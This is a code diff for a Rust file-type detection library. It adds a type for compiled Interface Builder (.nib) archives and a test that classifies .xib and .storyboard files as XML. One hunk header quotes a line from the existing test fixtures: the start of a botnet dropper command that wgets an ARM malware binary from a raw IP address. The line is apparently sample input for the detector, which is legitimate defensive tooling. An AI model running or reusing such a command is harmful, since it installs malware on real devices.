@@ -230,6 +230,7 @@ fn file_group(ft: FileType) -> &'static str {
         | FileType::YarnLock
         | FileType::PnpmLock
         | FileType::Plist
+        | FileType::Nib
         | FileType::Pbxproj
         | FileType::Cmake
         | FileType::Makefile
@@ -597,6 +598,12 @@ pub enum FileType {
     AppleScript,
     /// Apple Property List (.plist)
     Plist,
+    /// Compiled Interface Builder archive (.nib): the object graph AppKit or
+    /// UIKit instantiates for a window or view, in either the `NIBArchive`
+    /// layout or an `NSKeyedArchiver` binary plist. Distinct from `Plist`
+    /// because the graph names the app's own classes, action selectors,
+    /// and Swift modules, which is attribution a plain plist never carries.
+    Nib,
     /// Xcode project file (`project.pbxproj`) — an OpenStep-style property
     /// list describing targets, build phases, and build settings. Kept
     /// distinct from `Plist` because it is the only plist dialect that carries
@@ -816,6 +823,7 @@ impl FileType {
                 | Self::PyProjectToml
                 | Self::GithubActions
                 | Self::Plist
+                | Self::Nib
                 | Self::Pbxproj
                 | Self::PkgInfo
                 | Self::SrcInfo
@@ -903,6 +911,7 @@ impl FileType {
             Self::Xml => "xml",
             Self::Yaml => "yaml",
             Self::Plist => "plist",
+            Self::Nib => "nib",
             Self::Pbxproj => "pbxproj",
             Self::Cmake => "cmake",
             Self::Svg => "svg",
@@ -1053,6 +1062,7 @@ impl FileType {
             "xml" => Self::Xml,
             "yaml" => Self::Yaml,
             "plist" => Self::Plist,
+            "nib" => Self::Nib,
             "pbxproj" => Self::Pbxproj,
             "cmake" => Self::Cmake,
             "svg" => Self::Svg,
@@ -2410,6 +2420,17 @@ cd /tmp || /var/tmp; rm avtech.arm7; wget http://193.243.147.115/avtech.arm7; ch
     }
 
     #[test]
+    fn interface_builder_sources_are_xml() {
+        let xib = b"<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<document type=\"com.apple.InterfaceBuilder3.Cocoa.XIB\" version=\"3.0\">";
+        let det = detect(Path::new("Main.xib"), xib).unwrap();
+        assert_eq!(det.file_type, FileType::Xml);
+        assert!(!det.extension_mismatch());
+        let det = detect(Path::new("Main.storyboard"), xib).unwrap();
+        assert_eq!(det.file_type, FileType::Xml);
+        assert!(!det.extension_mismatch());
+    }
+
+    #[test]
     fn plist_by_ext() {
         assert_ext("prefs.plist", FileType::Plist);
     }
@@ -3115,6 +3136,7 @@ function wpcf7_special_mail_tag( $output, $name, $html ) {
             FileType::Json,
             FileType::Xml,
             FileType::Plist,
+            FileType::Nib,
             FileType::Svg,
             FileType::Html,
             FileType::Markdown,
